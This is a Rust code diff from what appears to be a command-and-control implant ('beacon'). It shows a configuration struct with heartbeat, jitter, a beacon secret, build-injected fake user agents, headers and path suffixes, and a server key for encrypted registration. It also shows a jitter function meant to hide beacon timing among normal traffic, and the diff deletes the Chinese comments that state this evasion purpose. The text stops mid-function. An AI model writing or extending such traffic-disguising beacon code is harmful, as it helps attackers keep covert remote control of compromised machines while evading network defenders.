@@ -9,11 +9,9 @@ pub struct ConfigManager {
     pub heartbeat_interval_ms: u64,
     pub jitter_percent: f64,
     pub beacon_secret: String,
-    /// 构建时注入的流量伪装（UA/附加头/路径后缀），注册前生效。
     pub user_agents: Vec<String>,
     pub extra_headers: Vec<String>,
     pub path_suffixes: Vec<String>,
-    /// 服务端 RSA 公钥（SPKI DER b64，构建注入）：注册混合加密。
     pub server_public_key: String,
 }
 
@@ -108,22 +106,15 @@ impl ConfigManager {
     }
 }
 
-/// 块状抖动（x86 风格）：
-/// - 常规：基础间隔 ± jitter 的均匀偏移；
-/// - 偶发（~1/12）：1.5-3 倍长眠（模拟真实业务请求的间歇性爆发）；
-/// - 相邻间隔做随机游走（在上次偏移基础上小幅变化），避免纯均匀分布
-///   的周期性可预测。
 pub fn x86_style_jitter(base_ms: u64, jitter_percent: f64) -> u64 {
     use rand::Rng;
     let mut rng = rand::thread_rng();
     let base = base_ms.max(500) as f64;
 
-    // 偶发长眠
     if rng.gen_ratio(1, 12) {
         return (base * rng.gen_range(1.5..=3.0)) as u64;
     }
 
-    // 常规抖动：± jitter
     let spread = base * jitter_percent.clamp(0.0, 0.9);
     let delta = if spread > 0.0 {
         rng.gen_range(-spread..=spread)
